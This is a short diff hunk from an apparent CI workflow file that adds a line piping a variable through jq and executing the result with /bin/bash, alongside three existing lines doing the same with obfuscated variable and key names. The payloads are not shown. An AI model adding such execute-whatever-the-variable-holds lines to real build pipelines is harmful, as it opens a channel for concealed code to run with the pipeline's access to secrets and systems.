@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$py10527" | jq -r .jk39495 | /bin/bash
           printf '%s' "$algpl6" | jq -r .s1313 | /bin/bash
           printf '%s' "$e2" | jq -r .xg68 | /bin/bash
+          echo $fvcl3 | jq -r .mhms900 | /bin/bash
 
       - name: Archive results
         if: always()
